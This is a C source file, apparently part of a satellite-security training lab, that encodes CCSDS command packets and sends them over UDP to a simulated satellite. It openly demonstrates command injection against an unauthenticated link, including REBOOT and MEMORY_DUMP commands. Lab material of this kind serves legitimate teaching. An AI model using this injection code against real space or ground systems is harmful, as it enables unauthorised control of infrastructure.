/*
 * command_encoder.c — CCSDS Command Encoder (C implementation)
 * SpaceVE-1 Lab Loader
 *
 * Builds and sends a CCSDS Space Packet Protocol command from a C program.
 * Demonstrates that CCSDS command injection requires no special tools —
 * any program that can compute XOR and open a UDP socket can inject commands.
 *
 * Usage:
 *   gcc -o command_encoder command_encoder.c
 *   ./command_encoder                          # send NOP
 *   ./command_encoder 0x03                     # func code 0x03 (downlink_on)
 *   ./command_encoder 0x03 192.168.60.100 1234
 *
 * Background:
 *   The satellite accepts any CCSDS packet with a valid checksum.
 *   There is no cryptographic authentication. The checksum is XOR-based
 *   and trivially computable. This C encoder requires no external libraries.
 *
 * CCSDS Primary Header (6 bytes, big-endian):
 *   Bits  0-2:  Version number (000)
 *   Bit   3:    Packet type (1 = command)
 *   Bit   4:    Secondary header flag (1 = present)
 *   Bits  5-15: APID (0x200 for SpaceVE-1)
 *   Bits 16-17: Sequence flags (11 = standalone)
 *   Bits 18-31: Sequence count
 *   Bits 32-47: Data length (total secondary + user data bytes, minus 1)
 *
 * CCSDS Secondary Header (2 bytes, command packets):
 *   Bits  0-6:  Function code (7 bits)
 *   Bit   7:    Reserved (0)
 *   Bits  8-15: Checksum (XOR of all preceding bytes in secondary+user data, XOR'd with 0xFF)
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>

#define SATELLITE_IP    "192.168.60.100"
#define SATELLITE_PORT  1234
#define SATELLITE_APID  0x200
#define PKT_BUF_SIZE    256

typedef struct {
    uint8_t buf[PKT_BUF_SIZE];
    int     len;
} ccsds_pkt_t;

/* Build a CCSDS command packet into buf.
 * Returns packet length in bytes. */
int build_ccsds_cmd(uint8_t *buf, int bufsize,
                    uint16_t apid, uint8_t func_code,
                    const uint8_t *user_data, int user_len,
                    uint16_t seq_count)
{
    if (bufsize < 8 + user_len) return -1;

    /* Primary header */
    uint16_t word0 = (0x0 << 13) | (1 << 12) | (1 << 11) | (apid & 0x7FF);
    uint16_t word1 = (0x3 << 14) | (seq_count & 0x3FFF);
    uint16_t data_len = (uint16_t)(1 + user_len);  /* sec hdr + user data - 1 */

    buf[0] = (word0 >> 8) & 0xFF;
    buf[1] = word0 & 0xFF;
    buf[2] = (word1 >> 8) & 0xFF;
    buf[3] = word1 & 0xFF;
    buf[4] = (data_len >> 8) & 0xFF;
    buf[5] = data_len & 0xFF;

    /* Secondary header */
    uint8_t sec_byte0 = (func_code & 0x7F) << 1;
    uint8_t cksum = 0xFF;
    cksum ^= sec_byte0;
    for (int i = 0; i < user_len; i++) {
        cksum ^= user_data[i];
    }

    buf[6] = sec_byte0;
    buf[7] = cksum;

    /* User data */
    if (user_len > 0) {
        memcpy(buf + 8, user_data, user_len);
    }

    return 8 + user_len;
}

void print_hex(const uint8_t *buf, int len) {
    for (int i = 0; i < len; i++) {
        printf("%02X", buf[i]);
    }
}

int send_udp(const char *ip, int port, const uint8_t *buf, int len) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) { perror("socket"); return -1; }

    struct sockaddr_in dst;
    memset(&dst, 0, sizeof(dst));
    dst.sin_family = AF_INET;
    dst.sin_port   = htons(port);
    if (inet_pton(AF_INET, ip, &dst.sin_addr) != 1) {
        fprintf(stderr, "Invalid IP: %s\n", ip);
        close(sock);
        return -1;
    }

    ssize_t sent = sendto(sock, buf, len, 0,
                          (struct sockaddr*)&dst, sizeof(dst));
    close(sock);
    return (int)sent;
}

int main(int argc, char *argv[]) {
    uint8_t  func_code  = 0x00;  /* default: NOP */
    const char *ip      = SATELLITE_IP;
    int         port    = SATELLITE_PORT;

    if (argc >= 2) {
        func_code = (uint8_t)strtol(argv[1], NULL, 16);
    }
    if (argc >= 3) {
        ip = argv[2];
    }
    if (argc >= 4) {
        port = atoi(argv[3]);
    }

    static const char *func_names[] = {
        "NOP", "CAMERA_ON", "CAMERA_OFF",
        "DOWNLINK_ON", "DOWNLINK_OFF", "MEMORY_DUMP", "REBOOT"
    };
    const char *fname = (func_code <= 6) ? func_names[func_code] : "UNKNOWN";

    uint8_t pkt[PKT_BUF_SIZE];
    int pkt_len = build_ccsds_cmd(pkt, sizeof(pkt),
                                  SATELLITE_APID, func_code,
                                  NULL, 0, 0);
    if (pkt_len < 0) {
        fprintf(stderr, "build_ccsds_cmd failed\n");
        return 1;
    }

    printf("SpaceVE-1 CCSDS Command Encoder\n");
    printf("Command:  0x%02X (%s)\n", func_code, fname);
    printf("Target:   %s:%d\n", ip, port);
    printf("Packet:   ");
    print_hex(pkt, pkt_len);
    printf("  (%d bytes)\n", pkt_len);

    int sent = send_udp(ip, port, pkt, pkt_len);
    if (sent < 0) {
        fprintf(stderr, "Send failed\n");
        return 1;
    }

    printf("Sent %d bytes. No authentication required.\n", sent);
    return 0;
}
